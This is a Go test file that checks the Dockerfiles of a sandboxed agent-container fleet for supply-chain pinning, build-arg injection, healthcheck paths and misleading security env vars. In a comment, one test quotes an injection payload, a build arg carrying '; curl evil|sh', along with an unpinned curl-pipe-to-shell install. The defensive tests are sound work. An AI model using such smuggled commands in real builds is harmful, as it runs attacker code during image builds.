// SPEC: _spec/_plans/image-size-reduction.puml, _spec/_devops/agent-version-pin.puml
package contract_test

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// aptDockerfiles run apt during the build, directly or through a tool that
// shells out to it. base-node-browser has no literal apt-get: `playwright
// install --with-deps` runs one internally, which is exactly why it is easy to
// miss when DEBIAN_FRONTEND stops being inherited.
var aptDockerfiles = []string{
	"defs/base/Dockerfile",
	"defs/base-node/Dockerfile",
	"defs/base-node-browser/Dockerfile",
	"defs/cecli/Dockerfile",
	"defs/cursor/Dockerfile",
	"defs/opencode/Dockerfile",
	"defs/claudecode/mcp/Dockerfile",
	"defs/claudecode/solidity/Dockerfile",
}

// mise is now the ONLY Go toolchain path, so an upstream compromise of the
// install script owns every Go build in the fleet. It is pinned the way bun and
// agent-browser are: a version and a per-arch digest, not `curl | sh`.
func TestMiseIsPinnedByVersionAndDigest(t *testing.T) {
	t.Parallel()
	df := readRepoFile(t, "defs/base/Dockerfile")
	for _, want := range []*regexp.Regexp{
		regexp.MustCompile(`(?m)^ARG MISE_VERSION=v\d+\.\d+\.\d+$`),
		regexp.MustCompile(`(?m)^ARG MISE_SHA256_X64=[0-9a-f]{64}$`),
		regexp.MustCompile(`(?m)^ARG MISE_SHA256_ARM64=[0-9a-f]{64}$`),
		regexp.MustCompile(`sha256sum -c`),
		regexp.MustCompile(`test "v\$\(mise --version`),
	} {
		if !want.MatchString(df) {
			t.Errorf("defs/base/Dockerfile lacks %s — mise must be pinned by version AND digest", want)
		}
	}
	if strings.Contains(instructionsOnly(df), "mise.run") {
		t.Error("`curl https://mise.run | sh` is unpinned and unverified; mise is the only Go toolchain path")
	}
}

// A build ARG interpolated into a `bash -c "..."` string is executed as code:
// --build-arg CURSOR_INSTALL_URL='https://x; curl evil|sh' ran arbitrary
// commands during the build. Passing it as a positional argument means the
// inner shell can never parse it as anything but data.
func TestInstallerURLsArePassedAsArgumentsNotCode(t *testing.T) {
	t.Parallel()
	df := readRepoFile(t, "defs/cursor/Dockerfile")
	if strings.Contains(df, `bash -c "curl -fsS ${CURSOR_INSTALL_URL}`) {
		t.Error("CURSOR_INSTALL_URL must not be interpolated into a bash -c string — a build-arg can inject shell")
	}
	if !strings.Contains(df, `bash -c 'curl -fsS "$1" | bash' cursor-install "$CURSOR_INSTALL_URL"`) {
		t.Error("the installer URL must arrive as a positional argument, quoted")
	}
}

// HEALTHCHECK is NOT in Docker's variable-substitution list, so `${USER_NAME}`
// there is never expanded — it would be empty at run time. The fix is not to
// parameterise the path but to stop depending on the user's name: /home/agent is
// the real home for every harness, and /home/<user> is a symlink to it.
func TestHealthchecksDoNotDependOnTheUserName(t *testing.T) {
	t.Parallel()
	for _, rel := range append([]string{}, aptDockerfiles...) {
		df := readRepoFile(t, rel)
		for _, line := range strings.Split(df, "\n") {
			if !strings.Contains(line, "test -f /home/") && !strings.Contains(line, "CMD test -f") {
				continue
			}
			if regexp.MustCompile(`/home/(claude|cursor|opencode|cecli)\b`).MatchString(line) {
				t.Errorf("%s healthcheck hard-codes a username path (%q); use /home/agent, the real home",
					rel, strings.TrimSpace(line))
			}
			if strings.Contains(line, "${USER_NAME}") && strings.Contains(line, "CMD") {
				t.Errorf("%s: HEALTHCHECK does not expand build args — ${USER_NAME} is empty at run time", rel)
			}
		}
	}
}

// DEBIAN_FRONTEND is a BUILD concern. As an ENV in proveo/base it was baked into
// the runtime environment of every descendant, silently changing apt's behaviour
// for the agent inside the sandbox — and it was declared after the apt-get lines
// it was supposed to govern, so it never applied to them either.
func TestDebianFrontendIsBuildOnly(t *testing.T) {
	t.Parallel()
	for _, rel := range aptDockerfiles {
		df := readRepoFile(t, rel)
		if regexp.MustCompile(`(?m)^ENV DEBIAN_FRONTEND`).MatchString(df) {
			t.Errorf("%s sets DEBIAN_FRONTEND as ENV — it belongs in an ARG, not the runtime environment", rel)
		}
		if !strings.Contains(df, "ARG DEBIAN_FRONTEND=noninteractive") {
			t.Errorf("%s runs apt during the build and must declare ARG DEBIAN_FRONTEND=noninteractive "+
				"(it is no longer inherited)", rel)
		}
	}
}

// Three env vars presented as security controls that nothing reads. RLIMIT_CORE
// and RLIMIT_NOFILE are not how setrlimit is set; YAMA_PTRACE_SCOPE is a host
// sysctl, not an environment variable. A test used to assert RLIMIT_CORE echoed
// back, which certified a non-control as a working one.
func TestNoEnvVarsPresentedAsControlsThatNothingReads(t *testing.T) {
	t.Parallel()
	for _, v := range []string{"RLIMIT_CORE", "RLIMIT_NOFILE", "YAMA_PTRACE_SCOPE"} {
		for _, rel := range aptDockerfiles {
			if strings.Contains(instructionsOnly(readRepoFile(t, rel)), v) {
				t.Errorf("%s declares %s, which nothing in the tree reads", rel, v)
			}
		}
		if strings.Contains(readRepoFile(t, "defs/claudecode/tests/test_security.sh"), v) {
			t.Errorf("test_security.sh asserts %s — that certifies a non-control as a working one", v)
		}
	}
}

// squid runs from UPSTREAM ubuntu/squid:latest (internal/egress/plan.go); the
// image name proveo/squid-proxy appears nowhere in the code. The Dockerfile that
// built it was dead, but its configs are not: embed.go carries them and
// egress.StageSquidConfig writes them into every session.
func TestSquidShipsConfigNotAnImage(t *testing.T) {
	t.Parallel()
	root := repoRoot(t)
	if _, err := os.Stat(filepath.Join(root, "defs/sidecars/squid-proxy/Dockerfile")); err == nil {
		t.Error("defs/sidecars/squid-proxy/Dockerfile is back — nothing builds or references proveo/squid-proxy")
	}
	for _, conf := range []string{"squid.conf", "firehol-blocked-nets.conf", "firehol-ipset.conf", "provider-allow.conf"} {
		if _, err := os.Stat(filepath.Join(root, "defs/sidecars/squid-proxy", conf)); err != nil {
			t.Errorf("%s must stay: embed.go carries it and StageSquidConfig writes it per session", conf)
		}
		if !strings.Contains(readRepoFile(t, "embed.go"), conf) {
			t.Errorf("embed.go must embed %s", conf)
		}
	}
}
